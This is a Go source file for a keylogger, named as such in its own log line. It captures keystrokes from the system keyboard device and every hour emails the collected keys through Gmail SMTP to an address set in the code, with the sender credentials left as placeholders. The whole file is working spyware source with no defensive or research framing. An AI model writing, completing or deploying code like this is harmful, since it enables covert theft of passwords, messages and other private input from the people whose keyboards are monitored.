package main

import (
	_ "fmt"
	"net/smtp"
	"strings"
	"time"

	"github.com/MarinX/keylogger"
	log "github.com/sirupsen/logrus"
)

var pressed_keys []string

func main() {
	log.Println("GO-Keylogger")

	x := true
	t0 := time.Duration(3600) * time.Second // 1 hour
Loop:
	for x {
		y := false
		readKeyboard()

		timer := time.AfterFunc(t0, func() {
			log.Println("Sending email")
			// fmt.Println(pressed_keys)
			// bodyString := strings.Join(pressed_keys[:], " ")
			// log.Println(bodyString)
			send()
			y = true
		})

		defer timer.Stop()

		if y {
			continue Loop
		}

	}

}

func readKeyboard() {
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) <= 0 {
		log.Error("No Keyboard Found")
		return
	}

	// log.Println("Found a Keyboard at", keyboard)

	k, err := keylogger.New(keyboard)
	check(err)
	defer k.Close()

	oldLen := len(pressed_keys)

	events := k.Read()

	// range of events
	for e := range events {
		switch e.Type {
		case keylogger.EvKey:
			// if the state of key is pressed
			if e.KeyPress() {
				// log.Println("[event] press key ", e.KeyString())
				pressed_keys = append(pressed_keys, e.KeyString())
			}

			// TODO: this can be useful?
			// if the state of key is released
			// if e.KeyRelease() {
			// 	log.Println("[event] release key ", e.KeyString())
			// }

		}
		if len(pressed_keys) >= oldLen+3 { // Append each 3 letters
			break
		}
	}
}

func send() {
	bodyString := strings.Join(pressed_keys[:], " ")
	from := "...@gmail.com"
	pass := "..."
	to := "..."

	msg := "From: " + from + "\n" +
		"To: " + to + "\n" +
		"Subject: Hello there\n\n" +
		bodyString

	err := smtp.SendMail("smtp.gmail.com:587",
		smtp.PlainAuth("", from, pass, "smtp.gmail.com"),
		from, []string{to}, []byte(msg))

	if err != nil {
		log.Printf("smtp error: %s", err)
		return
	}

	log.Println("sent")
}

func check(e error) {
	if e != nil {
		log.Error(e)
	}
}
